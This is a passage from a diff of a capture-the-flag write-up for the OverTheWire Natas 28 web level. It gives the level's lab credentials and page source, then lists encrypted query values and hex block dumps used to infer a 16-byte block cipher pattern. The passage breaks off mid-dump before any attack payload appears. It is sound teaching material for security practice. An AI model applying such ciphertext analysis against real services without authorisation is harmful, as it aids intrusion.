@@ -4351,11 +4351,554 @@ URL: http://natas28.natas.labs.overthewire.org
 Username: natas28
 Password: 1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj
 ```
-After login, the following note is displayed: 
+After login, the webpage display `Whack Computer Joke Database` header and `sorry, we are currently out of sauce` footer and request for search input and a search button. Below is the source code of this page: 
+```
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas28", "pass": "1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj" };</script></head>
+<body>
+<!--
+    morla/10111
+    y0 n0th!
+-->
+<h1>natas28</h1>
+<div id="content">
 
-### Approach 
+<form action="index.php" method="POST">
+    <h2> Whack Computer Joke Database</h2>
+    Search: <input name="query"><br>
+    <input type="submit" value="search" />
+</form>
+
+
+<div id="viewsource">sorry, we are currently out of sauce</div>
+</div>
+</body>
+</html>
+```
 
 ### Finding 
+attempt to input `a` and the query is `G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKriAqPE2%2B%2BuYlniRMkobB1vfoQVOxoUVz5bypVRFkZR5BPSyq%2FLC12hqpypTFRyXA%3D`
+attempt to input `aa` and the query is `G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKxMKUxvsiccFITv6XJZnrHSHmaB7HSm1mCAVyTVcLgDq3tm9uspqc7cbNaAQ0sTFc%3D`
+attempt to input `aaa` and the query is `G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPIvUpOmOsuf6Me06CS3bWodmi4rXbbzHxmhT3Vnjq2qkEJJuT5N6gkJR5mVucRLNRo%3D`
+
+attempt to decode the query using url decode and base64 decode, however, the return output is "alien" language. Therefore, we can conclude that the query has been encrypted using some method. 
+to make it more human readable, we need to find the pattern of the query. 
+
+below is the query format after attempt for `a` until 50x`a`
+```
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKriAqPE2%2B%2BuYlniRMkobB1vfoQVOxoUVz5bypVRFkZR5BPSyq%2FLC12hqpypTFRyXA%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKxMKUxvsiccFITv6XJZnrHSHmaB7HSm1mCAVyTVcLgDq3tm9uspqc7cbNaAQ0sTFc%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPIvUpOmOsuf6Me06CS3bWodmi4rXbbzHxmhT3Vnjq2qkEJJuT5N6gkJR5mVucRLNRo%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPI1BKmpZ1%2F9YUtPH5DShPyqKSh%2FPMVHnhLmbzHIY7GAR1bVcy3Ix3D2Q5cVi8F6bmY%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLDah8EaRWKMFIWYUal4%2FLsrDuHHBxEg4a0XNNtno9y9GVRSbu6ISPYnZVBfqJ%2FOns%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJKEf%2FnOv0V2qBes8NIbc3hQcCYxLrNxe2TV1ZOUQXdfmTQ3MhoJTaSrfy9N5bRv4o%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKf3hzvbj%2BEoXJjPzB0%2FI4YZIaVSupG%2B5Ppq4WEW09L0Nf%2FK3JUU%2FwpRwHlH118D44%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJFPgAgYC9NzNUPDrdwlHfCiW3pCIT4YQixZ%2Fi0rqXXY5FyMgUUg%2BaORY%2FQZhZ7MKM%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKeYiaGpSZAWVcGCZq8sFK7oJUi8wHPnTascCPxZZSMWpc5zZBSL6eob5V3O1b5%2BMA%3D
+
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oec4pf%2B0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI%
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OetO2gh9PAvqK%2B3BthQLni68qM9OYQkTq645oGdhkgSlo%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OezoKpVTtluBKA%2B2078pAPR3X9UET9Bj0m9rt%2Fc0tByJk%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OeH3RxTXb8xdRkxqIh5u2Y5GIjoU2cQpG5h3WwP7xz1O3YrlHX2nGysIPZGaDXuIuY
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oe7NNvj9kWTUA1QORJcH0n5UJXo0PararywOOh1xzgPdF7e6ymVfKYoyHpDj96YNTY
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OeWu8qmX2iNj9yo%2FrTMtFzb6dz8xhQlKoBQI8fl9A304VnjFdz7MKPhw5PTrxsgHCk
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OeiSUVjPxawG0iv9oLcsjxUad%2BjtGqvgtdBcT%2F5qwUI6tHjrGh%2FiYaLGwVBhEJs%2F7a
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OerfihrQF37R7K06x8EIKqnr36EFTsaFFc%2BW8qVURZGUeQT0sqvywtdoaqcqUxUclw
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OeU9lJnrytaGHwS3zcJPMEYkh5mgex0ptZggFck1XC4A6t7ZvbrKanO3GzWgENLExX
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OepUn9pSttm04mMtsxg4hW1ZouK1228x8ZoU91Z46tqpBCSbk%2BTeoJCUeZlbnESzUa
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OeIBG75Ijd4bvslhthcLMOEikofzzFR54S5m8xyGOxgEdW1XMtyMdw9kOXFYvBem5m
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OeiCmh%2BTDOtWa4NEQcBXdALKw7hxwcRIOGtFzTbZ6PcvRlUUm7uiEj2J2VQX6ifzp7
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OeVHYCtS%2BuFWasjpcfkfbWBUHAmMS6zcXtk1dWTlEF3X5k0NzIaCU2kq38vTeW0b%2BK
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OepFqT7keU0bYgT7CSC2jyfWSGlUrqRvuT6auFhFtPS9DX%2FytyVFP8KUcB5R9dfA%2BO
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oe7aEY%2BZn5SV6PPZc%2FumUoo4lt6QiE%2BGEIsWf4tK6l12ORcjIFFIPmjkWP0GYWezCj
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oe8pCcTVN4HuF3egErsaclQaCVIvMBz502rHAj8WWUjFqXOc2QUi%2BnqG%2BVdztW%2BfjA
+
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo3OKX%2FtKRQAkZ3UXWuWWu9bzTfM5xp7c4R9mULvO1icC
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo7TtoIfTwL6ivtwbYUC54uvKjPTmEJE6uuOaBnYZIEpa
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo86CqVU7ZbgSgPttO%2FKQD0d1%2FVBE%2FQY9Jva7f3NLQciZ
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqox90cU12%2FMXUZMaiIebtmORiI6FNnEKRuYd1sD%2B8c9Tt2K5R19pxsrCD2Rmg17iLmA%3D%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo%2BzTb4%2FZFk1ANUDkSXB9J%2BVCV6ND2q2q8sDjodcc4D3Re3usplXymKMh6Q4%2FemDU2A%3D%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo1rvKpl9ojY%2FcqP60zLRc2%2Bnc%2FMYUJSqAUCPH5fQN9OFZ4xXc%2BzCj4cOT068bIBwpA%3D%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo4klFYz8WsBtIr%2FaC3LI8VGnfo7Rqr4LXQXE%2F%2BasFCOrR46xof4mGixsFQYRCbP%2B2g%3D%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo634oa0Bd%2B0eytOsfBCCqp69%2BhBU7GhRXPlvKlVEWRlHkE9LKr8sLXaGqnKlMVHJcA%3D%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo1PZSZ68rWhh8Et83CTzBGJIeZoHsdKbWYIBXJNVwuAOre2b26ympztxs1oBDSxMVw%3D%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo6VJ%2FaUrbZtOJjLbMYOIVtWaLitdtvMfGaFPdWeOraqQQkm5Pk3qCQlHmZW5xEs1Gg%3D%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqoyARu%2BSI3eG77JYbYXCzDhIpKH88xUeeEuZvMchjsYBHVtVzLcjHcPZDlxWLwXpuZg%3D%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo4gpofkwzrVmuDREHAV3QCysO4ccHESDhrRc022ej3L0ZVFJu7ohI9idlUF%2Bon86ew%3D%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo1R2ArUvrhVmrI6XH5H21gVBwJjEus3F7ZNXVk5RBd1%2BZNDcyGglNpKt%2FL03ltG%2Fig%3D%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo6Rak%2B5HlNG2IE%2Bwkgto8n1khpVK6kb7k%2BmrhYRbT0vQ1%2F8rclRT%2FClHAeUfXXwPjg%3D%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo%2B2hGPmZ%2BUlejz2XP7plKKOJbekIhPhhCLFn%2BLSupddjkXIyBRSD5o5Fj9BmFnswow%3D%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo%2FKQnE1TeB7hd3oBK7GnJUGglSLzAc%2BdNqxwI%2FFllIxalznNkFIvp6hvlXc7Vvn4wA%3D%3D
+
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo7OQOMKN95tl0mFR31j36qNzil%2F7SkUAJGd1F1rllrvW803zOcae3OEfZlC7ztYnAg%3D%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo7OQOMKN95tl0mFR31j36qO07aCH08C%2Bor7cG2FAueLryoz05hCROrrjmgZ2GSBKWg%3D%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo7OQOMKN95tl0mFR31j36qPOgqlVO2W4EoD7bTvykA9Hdf1QRP0GPSb2u39zS0HImQ%3D%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo7OQOMKN95tl0mFR31j36qMfdHFNdvzF1GTGoiHm7ZjkYiOhTZxCkbmHdbA%2FvHPU7diuUdfacbKwg9kZoNe4i5g%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo7OQOMKN95tl0mFR31j36qPs02%2BP2RZNQDVA5ElwfSflQlejQ9qtqvLA46HXHOA90Xt7rKZV8pijIekOP3pg1Ng%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo7OQOMKN95tl0mFR31j36qNa7yqZfaI2P3Kj%2BtMy0XNvp3PzGFCUqgFAjx%2BX0DfThWeMV3Pswo%2BHDk9OvGyAcKQ%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo7OQOMKN95tl0mFR31j36qOJJRWM%2FFrAbSK%2F2gtyyPFRp36O0aq%2BC10FxP%2FmrBQjq0eOsaH%2BJhosbBUGEQmz%2Fto%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo7OQOMKN95tl0mFR31j36qOt%2BKGtAXftHsrTrHwQgqqevfoQVOxoUVz5bypVRFkZR5BPSyq%2FLC12hqpypTFRyXA%3D
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo7OQOMKN95tl0mFR31j36qNT2UmevK1oYfBLfNwk8wRiSHmaB7HSm1mCAVyTVcLgDq3tm9uspqc7cbNaAQ0sTFc%3D
+...
+
+```
+
+can observed that 
+from 1`a` until 9`a`, there is repeated pattern of `G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjP`
+from 10`a` until 25`a`, there is repeated pattern of G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjP`LAhy3ui8kLEVaROwiiI6Oe`
+from 26`a` until 41`a`, there is repeated pattern of G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oe`s5A4wo33m2XSYVHfWPfq`
+from 41`a` onwards, there is a repeated pattern of G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfq`o7OQOMKN95tl0mFR31j36q`
+therefore, we can identified that the 16 bytes block size is used for each pattern changes.
+
+
+convert the url query collected for each attempt as input. Go to cyberchef, do the following recipe: 
+1. Fork >> split delimeter: \n >> Merge delimeter" \n\n to separate each attempt with a line break, easier to be analyzed later.
+2. URL Decode
+3. From Base64 (not human readble, thus hard to analyze)
+4. To Hex >> Delimeter: None >> Bytes per line: 16 (to make it readable)
+
+output: 
+```
+1be82511a7ba5bfd578c0eef466db59c
+dc84728fdcf89d93751d10a7c75c8cf2
+ab880a8f136fbeb98967891324a1b075
+bdfa1054ec68515cf96f2a5544591947
+904f4b2abf2c2d7686aa72a53151c970
+
+1be82511a7ba5bfd578c0eef466db59c
+dc84728fdcf89d93751d10a7c75c8cf2
+b130a531bec89c705213bfa5c9667ac7
+48799a07b1d29b5982015c9355c2e00e
+aded9bdbaca6a73b71b35a010d2c4c57
+
+1be82511a7ba5bfd578c0eef466db59c
+dc84728fdcf89d93751d10a7c75c8cf2
+2f5293a63acb9fe8c7b4e824b76d6a1d
+9a2e2b5db6f31f19a14f75678eadaa90
+4249b93e4dea0909479995b9c44b351a
+
+1be82511a7ba5bfd578c0eef466db59c
+dc84728fdcf89d93751d10a7c75c8cf2
+3504a9a9675ffd614b4f1f90d284fcaa
+29287f3cc5479e12e66f31c863b18047
+56d5732dc8c770f64397158bc17a6e66
+
+1be82511a7ba5bfd578c0eef466db59c
+dc84728fdcf89d93751d10a7c75c8cf2
+c36a1f0469158a3052166146a5e3f2ec
+ac3b871c1c448386b45cd36d9e8f72f4
+655149bbba2123d89d95417ea27f3a7b
+
+1be82511a7ba5bfd578c0eef466db59c
+dc84728fdcf89d93751d10a7c75c8cf2
+4a11ffe73afd15daa05eb3c3486dcde1
+41c098c4bacdc5ed9357564e5105dd7e
+64d0dcc868253692adfcbd3796d1bf8a
+
+1be82511a7ba5bfd578c0eef466db59c
+dc84728fdcf89d93751d10a7c75c8cf2
+9fde1cef6e3f84a172633f3074fc8e18
+6486954aea46fb93e9ab85845b4f4bd0
+d7ff2b725453fc294701e51f5d7c0f8e
+
+1be82511a7ba5bfd578c0eef466db59c
+dc84728fdcf89d93751d10a7c75c8cf2
+453e0020602f4dccd50f0eb7709477c2
+896de90884f86108b167f8b4aea5d763
+917232051483e68e458fd066167b30a3
+
+1be82511a7ba5bfd578c0eef466db59c
+dc84728fdcf89d93751d10a7c75c8cf2
+9e622686a52640595706099abcb052bb
+a09522f301cf9d36ac7023f165948c5a
+9739cd90522fa7a86f95773b56f9f8c0
+
+1be82511a7ba5bfd578c0eef466db59c
+dc84728fdcf89d93751d10a7c75c8cf2
+c0872dee8bc90b1156913b08a223a39e
+738a5ffb4a4500246775175ae596bbd6
+f34df339c69edce11f6650bbced62702
+
+1be82511a7ba5bfd578c0eef466db59c
+dc84728fdcf89d93751d10a7c75c8cf2
+c0872dee8bc90b1156913b08a223a39e
+b4eda087d3c0bea2bedc1b6140b9e2eb
+ca8cf4e610913abae39a067619204a5a
+
+1be82511a7ba5bfd578c0eef466db59c
+dc84728fdcf89d93751d10a7c75c8cf2
+c0872dee8bc90b1156913b08a223a39e
+ce82a9553b65b81280fb6d3bf2900f47
+75fd5044fd063d26f6bb7f734b41c899
+
+1be82511a7ba5bfd578c0eef466db59c
+dc84728fdcf89d93751d10a7c75c8cf2
+c0872dee8bc90b1156913b08a223a39e
+1f74714d76fcc5d464c6a221e6ed98e4
+6223a14d9c4291b98775b03fbc73d4ed
+d8ae51d7da71b2b083d919a0d7b88b98
+
+1be82511a7ba5bfd578c0eef466db59c
+dc84728fdcf89d93751d10a7c75c8cf2
+c0872dee8bc90b1156913b08a223a39e
+ecd36f8fd9164d403540e449707d27e5
+4257a343daadaaf2c0e3a1d71ce03dd1
+7b7baca655f298a321e90e3f7a60d4d8
+
+1be82511a7ba5bfd578c0eef466db59c
+dc84728fdcf89d93751d10a7c75c8cf2
+c0872dee8bc90b1156913b08a223a39e
+5aef2a997da2363f72a3fad332d1736f
+a773f3185094aa01408f1f97d037d385
+678c5773ecc28f870e4f4ebc6c8070a4
+
+1be82511a7ba5bfd578c0eef466db59c
+dc84728fdcf89d93751d10a7c75c8cf2
+c0872dee8bc90b1156913b08a223a39e
+8925158cfc5ac06d22bfda0b72c8f151
+a77e8ed1aabe0b5d05c4ffe6ac1423ab
+478eb1a1fe261a2c6c15061109b3feda
+
+1be82511a7ba5bfd578c0eef466db59c
+dc84728fdcf89d93751d10a7c75c8cf2
+c0872dee8bc90b1156913b08a223a39e
+adf8a1ad0177ed1ecad3ac7c1082aa9e
+bdfa1054ec68515cf96f2a5544591947
+904f4b2abf2c2d7686aa72a53151c970
+
+1be82511a7ba5bfd578c0eef466db59c
+dc84728fdcf89d93751d10a7c75c8cf2
+c0872dee8bc90b1156913b08a223a39e
+53d9499ebcad6861f04b7cdc24f30462
+48799a07b1d29b5982015c9355c2e00e
+aded9bdbaca6a73b71b35a010d2c4c57
+
+1be82511a7ba5bfd578c0eef466db59c
+dc84728fdcf89d93751d10a7c75c8cf2
+c0872dee8bc90b1156913b08a223a39e
+a549fda52b6d9b4e2632db31838856d5
+9a2e2b5db6f31f19a14f75678eadaa90
+4249b93e4dea0909479995b9c44b351a
+
+1be82511a7ba5bfd578c0eef466db59c
+dc84728fdcf89d93751d10a7c75c8cf2
+c0872dee8bc90b1156913b08a223a39e
+2011bbe488dde1bbec961b6170b30e12
+29287f3cc5479e12e66f31c863b18047
+56d5732dc8c770f64397158bc17a6e66
+
+1be82511a7ba5bfd578c0eef466db59c
+dc84728fdcf89d93751d10a7c75c8cf2
+c0872dee8bc90b1156913b08a223a39e
+8829a1f930ceb566b834441c0577402c
+ac3b871c1c448386b45cd36d9e8f72f4
+655149bbba2123d89d95417ea27f3a7b
+
+1be82511a7ba5bfd578c0eef466db59c
+dc84728fdcf89d93751d10a7c75c8cf2
+c0872dee8bc90b1156913b08a223a39e
+547602b52fae1566ac8e971f91f6d605
+41c098c4bacdc5ed9357564e5105dd7e
+64d0dcc868253692adfcbd3796d1bf8a
+
+1be82511a7ba5bfd578c0eef466db59c
+dc84728fdcf89d93751d10a7c75c8cf2
+c0872dee8bc90b1156913b08a223a39e
+a45a93ee4794d1b6204fb0920b68f27d
+6486954aea46fb93e9ab85845b4f4bd0
+d7ff2b725453fc294701e51f5d7c0f8e
+
+1be82511a7ba5bfd578c0eef466db59c
+dc84728fdcf89d93751d10a7c75c8cf2
+c0872dee8bc90b1156913b08a223a39e
+eda118f999f9495e8f3d973fba6528a3
+896de90884f86108b167f8b4aea5d763
+917232051483e68e458fd066167b30a3
+
+1be82511a7ba5bfd578c0eef466db59c
+dc84728fdcf89d93751d10a7c75c8cf2
+c0872dee8bc90b1156913b08a223a39e
+f2909c4d53781ee1777a012bb1a72541
+a09522f301cf9d36ac7023f165948c5a
+9739cd90522fa7a86f95773b56f9f8c0
+
+1be82511a7ba5bfd578c0eef466db59c
+dc84728fdcf89d93751d10a7c75c8cf2
+c0872dee8bc90b1156913b08a223a39e
+b39038c28df79b65d26151df58f7eaa3
+738a5ffb4a4500246775175ae596bbd6
+f34df339c69edce11f6650bbced62702
+
+1be82511a7ba5bfd578c0eef466db59c
+dc84728fdcf89d93751d10a7c75c8cf2
+c0872dee8bc90b1156913b08a223a39e
+b39038c28df79b65d26151df58f7eaa3
+b4eda087d3c0bea2bedc1b6140b9e2eb
+ca8cf4e610913abae39a067619204a5a
+
+1be82511a7ba5bfd578c0eef466db59c
+dc84728fdcf89d93751d10a7c75c8cf2
+c0872dee8bc90b1156913b08a223a39e
+b39038c28df79b65d26151df58f7eaa3
+ce82a9553b65b81280fb6d3bf2900f47
+75fd5044fd063d26f6bb7f734b41c899
+
+1be82511a7ba5bfd578c0eef466db59c
+dc84728fdcf89d93751d10a7c75c8cf2
+c0872dee8bc90b1156913b08a223a39e
+b39038c28df79b65d26151df58f7eaa3
+1f74714d76fcc5d464c6a221e6ed98e4
+6223a14d9c4291b98775b03fbc73d4ed
+d8ae51d7da71b2b083d919a0d7b88b98
+
+1be82511a7ba5bfd578c0eef466db59c
+dc84728fdcf89d93751d10a7c75c8cf2
+c0872dee8bc90b1156913b08a223a39e
+b39038c28df79b65d26151df58f7eaa3
+ecd36f8fd9164d403540e449707d27e5
+4257a343daadaaf2c0e3a1d71ce03dd1
+7b7baca655f298a321e90e3f7a60d4d8
+
+1be82511a7ba5bfd578c0eef466db59c
+dc84728fdcf89d93751d10a7c75c8cf2
+c0872dee8bc90b1156913b08a223a39e
+b39038c28df79b65d26151df58f7eaa3
+5aef2a997da2363f72a3fad332d1736f
+a773f3185094aa01408f1f97d037d385
+678c5773ecc28f870e4f4ebc6c8070a4
+
+1be82511a7ba5bfd578c0eef466db59c
+dc84728fdcf89d93751d10a7c75c8cf2
+c0872dee8bc90b1156913b08a223a39e
+b39038c28df79b65d26151df58f7eaa3
+8925158cfc5ac06d22bfda0b72c8f151
+a77e8ed1aabe0b5d05c4ffe6ac1423ab
+478eb1a1fe261a2c6c15061109b3feda
+
+1be82511a7ba5bfd578c0eef466db59c
+dc84728fdcf89d93751d10a7c75c8cf2
+c0872dee8bc90b1156913b08a223a39e
+b39038c28df79b65d26151df58f7eaa3
+adf8a1ad0177ed1ecad3ac7c1082aa9e
+bdfa1054ec68515cf96f2a5544591947
+904f4b2abf2c2d7686aa72a53151c970
+
+1be82511a7ba5bfd578c0eef466db59c
+dc84728fdcf89d93751d10a7c75c8cf2
+c0872dee8bc90b1156913b08a223a39e
+b39038c28df79b65d26151df58f7eaa3
+53d9499ebcad6861f04b7cdc24f30462
+48799a07b1d29b5982015c9355c2e00e
+aded9bdbaca6a73b71b35a010d2c4c57
+
+1be82511a7ba5bfd578c0eef466db59c
+dc84728fdcf89d93751d10a7c75c8cf2
+c0872dee8bc90b1156913b08a223a39e
+b39038c28df79b65d26151df58f7eaa3
+a549fda52b6d9b4e2632db31838856d5
+9a2e2b5db6f31f19a14f75678eadaa90
+4249b93e4dea0909479995b9c44b351a
+
+1be82511a7ba5bfd578c0eef466db59c
+dc84728fdcf89d93751d10a7c75c8cf2
+c0872dee8bc90b1156913b08a223a39e
+b39038c28df79b65d26151df58f7eaa3
+2011bbe488dde1bbec961b6170b30e12
+29287f3cc5479e12e66f31c863b18047
+56d5732dc8c770f64397158bc17a6e66
+
+1be82511a7ba5bfd578c0eef466db59c
+dc84728fdcf89d93751d10a7c75c8cf2
+c0872dee8bc90b1156913b08a223a39e
+b39038c28df79b65d26151df58f7eaa3
+8829a1f930ceb566b834441c0577402c
+ac3b871c1c448386b45cd36d9e8f72f4
+655149bbba2123d89d95417ea27f3a7b
+
+1be82511a7ba5bfd578c0eef466db59c
+dc84728fdcf89d93751d10a7c75c8cf2
+c0872dee8bc90b1156913b08a223a39e
+b39038c28df79b65d26151df58f7eaa3
+547602b52fae1566ac8e971f91f6d605
+41c098c4bacdc5ed9357564e5105dd7e
+64d0dcc868253692adfcbd3796d1bf8a
+
+1be82511a7ba5bfd578c0eef466db59c
+dc84728fdcf89d93751d10a7c75c8cf2
+c0872dee8bc90b1156913b08a223a39e
+b39038c28df79b65d26151df58f7eaa3
+a45a93ee4794d1b6204fb0920b68f27d
+6486954aea46fb93e9ab85845b4f4bd0
+d7ff2b725453fc294701e51f5d7c0f8e
+
+1be82511a7ba5bfd578c0eef466db59c
+dc84728fdcf89d93751d10a7c75c8cf2
+c0872dee8bc90b1156913b08a223a39e
+b39038c28df79b65d26151df58f7eaa3
+eda118f999f9495e8f3d973fba6528a3
+896de90884f86108b167f8b4aea5d763
+917232051483e68e458fd066167b30a3
+
+1be82511a7ba5bfd578c0eef466db59c
+dc84728fdcf89d93751d10a7c75c8cf2
+c0872dee8bc90b1156913b08a223a39e
+b39038c28df79b65d26151df58f7eaa3
+f2909c4d53781ee1777a012bb1a72541
+a09522f301cf9d36ac7023f165948c5a
+9739cd90522fa7a86f95773b56f9f8c0
+
+1be82511a7ba5bfd578c0eef466db59c
